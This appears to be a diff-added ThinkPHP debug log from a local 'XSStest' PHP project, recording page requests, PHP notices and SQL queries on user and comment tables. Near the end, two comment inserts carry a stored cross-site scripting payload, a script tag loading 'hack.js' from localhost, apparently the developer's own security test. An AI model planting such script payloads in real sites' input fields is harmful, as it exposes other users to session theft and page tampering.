+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003635s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003664s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000113s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000140s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000329s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000358s ]
+
+[ 2016-05-03T13:09:39+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000206s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000258s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000288s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 37 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000025s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000062s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003617s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003644s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000098s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000122s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000303s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000331s ]
+
+[ 2016-05-03T13:09:39+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000209s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000258s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000289s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 37 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000027s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000078s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003647s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003676s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000124s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000157s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000511s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000566s ]
+
+[ 2016-05-03T13:09:39+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000284s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000260s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000290s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 37 行.
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 38 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000126s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000268s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.004602s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.004629s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000108s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000131s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000297s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000323s ]
+
+[ 2016-05-03T15:39:35+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003774s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.003992s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004101s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000115s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000228s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.022260s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.022356s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001802s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001874s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001984s ]
+INFO: [ app_end ] --END-- [ RunTime:0.002089s ]
+
+[ 2016-05-03T15:39:38+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/check
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000281s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000285s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000320s ]
+SQL: SHOW COLUMNS FROM `p_user` [ RunTime:0.0113s ]
+SQL: SELECT `password` FROM `p_user` WHERE `username` = 'wen' LIMIT 1   [ RunTime:0.0004s ]
+SQL: SELECT * FROM `p_user`  [ RunTime:0.0004s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000060s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000174s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.011085s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.011208s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000218s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000266s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000768s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000831s ]
+
+[ 2016-05-03T15:39:47+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000312s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000411s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000454s ]
+NOTIC: [2] array_push() expects parameter 1 to be array, null given /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 31 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000036s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000128s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.004974s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.005011s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000105s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000128s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000417s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000452s ]
+
+[ 2016-05-03T15:50:52+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000532s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000947s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001033s ]
+SQL: SHOW COLUMNS FROM `p_comment` [ RunTime:0.0074s ]
+SQL: INSERT INTO `p_comment` (`username`,`comment`) VALUES ('liu','123214') [ RunTime:0.0071s ]
+SQL: SELECT * FROM `p_comment`  [ RunTime:0.0004s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000070s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000166s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010337s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.010412s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000219s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000266s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000732s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000791s ]
+
+[ 2016-05-03T15:51:04+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000349s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000406s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000448s ]
+SQL: SHOW COLUMNS FROM `p_comment` [ RunTime:0.0067s ]
+SQL: INSERT INTO `p_comment` (`username`,`comment`) VALUES ('zhang','sajdfl;jk') [ RunTime:0.0025s ]
+SQL: SELECT * FROM `p_comment`  [ RunTime:0.0007s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000071s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000166s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.008525s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.008630s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000212s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000260s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000826s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000891s ]
+
+[ 2016-05-03T15:51:13+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000359s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000444s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000485s ]
+SQL: SHOW COLUMNS FROM `p_comment` [ RunTime:0.0030s ]
+SQL: INSERT INTO `p_comment` (`username`,`comment`) VALUES ('askdjl','asdfdsa') [ RunTime:0.0030s ]
+SQL: SELECT * FROM `p_comment`  [ RunTime:0.0002s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000047s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000114s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.006791s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.006881s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000197s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000242s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000928s ]
+INFO: [ app_end ] --END-- [ RunTime:0.001024s ]
+
+[ 2016-05-03T15:51:30+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000426s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000451s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000495s ]
+SQL: SHOW COLUMNS FROM `p_comment` [ RunTime:0.0067s ]
+SQL: INSERT INTO `p_comment` (`username`,`comment`) VALUES ('askdjl','asdfdsa') [ RunTime:0.0025s ]
+SQL: SELECT * FROM `p_comment`  [ RunTime:0.0004s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000061s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000153s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.008500s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.008589s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000140s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000172s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000531s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000572s ]
+
+[ 2016-05-03T15:51:44+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000598s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000746s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000808s ]
+SQL: SHOW COLUMNS FROM `p_comment` [ RunTime:0.0032s ]
+SQL: INSERT INTO `p_comment` (`username`,`comment`) VALUES ('askdjl','asdfdsa') [ RunTime:0.0029s ]
+SQL: SELECT * FROM `p_comment`  [ RunTime:0.0002s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000041s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000104s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.004388s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.004437s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000117s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000141s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000409s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000442s ]
+
+[ 2016-05-03T15:51:52+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000210s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000259s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000290s ]
+SQL: SHOW COLUMNS FROM `p_comment` [ RunTime:0.0069s ]
+SQL: INSERT INTO `p_comment` (`username`,`comment`) VALUES ('askdjl','asdfdsa') [ RunTime:0.0034s ]
+SQL: SELECT * FROM `p_comment`  [ RunTime:0.0023s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000050s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000128s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010092s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.010173s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000214s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000261s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000656s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000725s ]
+
+[ 2016-05-03T15:54:41+08:00 ] ::1 /eclipse/XSStest/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003671s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.003817s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.003924s ]
+INFO: [ view_parse ] --START--
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003887s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003987s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000489s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000551s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004130s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004209s ]
+
+[ 2016-05-03T15:54:51+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000335s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000412s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000453s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000043s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000119s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.014216s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.014295s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000168s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000199s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000499s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000550s ]
+
+[ 2016-05-03T15:54:54+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/check
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000209s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000259s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000290s ]
+SQL: SHOW COLUMNS FROM `p_user` [ RunTime:0.0074s ]
+SQL: SELECT `password` FROM `p_user` WHERE `username` = 'wen' LIMIT 1   [ RunTime:0.0004s ]
+SQL: SHOW COLUMNS FROM `p_comment` [ RunTime:0.0068s ]
+SQL: SELECT * FROM `p_comment`  [ RunTime:0.0004s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000051s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000165s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.013658s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.013777s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000256s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000307s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000772s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000835s ]
+
+[ 2016-05-03T15:55:00+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000218s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000265s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000297s ]
+SQL: SHOW COLUMNS FROM `p_comment` [ RunTime:0.0031s ]
+SQL: INSERT INTO `p_comment` (`username`,`comment`) VALUES ('wang','adsadfasdf') [ RunTime:0.0037s ]
+SQL: SELECT * FROM `p_comment`  [ RunTime:0.0004s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000040s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000102s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.007475s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.007544s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000181s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000215s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000423s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000469s ]
+
+[ 2016-05-03T16:18:04+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.004001s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.004023s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004118s ]
+SQL: SHOW COLUMNS FROM `p_comment` [ RunTime:0.0075s ]
+SQL: INSERT INTO `p_comment` (`username`,`comment`) VALUES ('kik','&ltscript src=\'http://localhost/XSS/hack.js\'&gt
+ &lt/script&gt') [ RunTime:0.0028s ]
+SQL: SELECT * FROM `p_comment`  [ RunTime:0.0004s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000049s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000133s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.020684s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.020779s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.003582s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.003662s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.003970s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004064s ]
+
+[ 2016-05-03T16:18:32+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003980s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.004231s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004339s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000068s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000166s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.028181s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.028304s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.003633s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.003711s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004142s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004240s ]
+
+[ 2016-05-03T16:18:35+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/check
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000210s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000278s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000309s ]
+SQL: SHOW COLUMNS FROM `p_user` [ RunTime:0.0072s ]
+SQL: SELECT `password` FROM `p_user` WHERE `username` = 'wen' LIMIT 1   [ RunTime:0.0005s ]
+SQL: SHOW COLUMNS FROM `p_comment` [ RunTime:0.0068s ]
+SQL: SELECT * FROM `p_comment`  [ RunTime:0.0004s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000074s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000167s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010113s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.010221s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000242s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000301s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000633s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000691s ]
+
+[ 2016-05-03T16:18:42+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000343s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000411s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000455s ]
+SQL: SHOW COLUMNS FROM `p_comment` [ RunTime:0.0066s ]
+SQL: INSERT INTO `p_comment` (`username`,`comment`) VALUES ('fff','<script src=\'http://localhost/XSS/hack.js\'>
+ </script>') [ RunTime:0.0025s ]
+SQL: SELECT * FROM `p_comment`  [ RunTime:0.0003s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000047s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000097s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.005347s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.005406s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000112s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000166s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000445s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000478s ]
+
+[ 2016-05-03T16:21:39+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003923s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.004042s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004130s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000047s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000123s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.019404s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.019499s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.002979s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.003078s ]
+INFO: [ app_end ] --START--
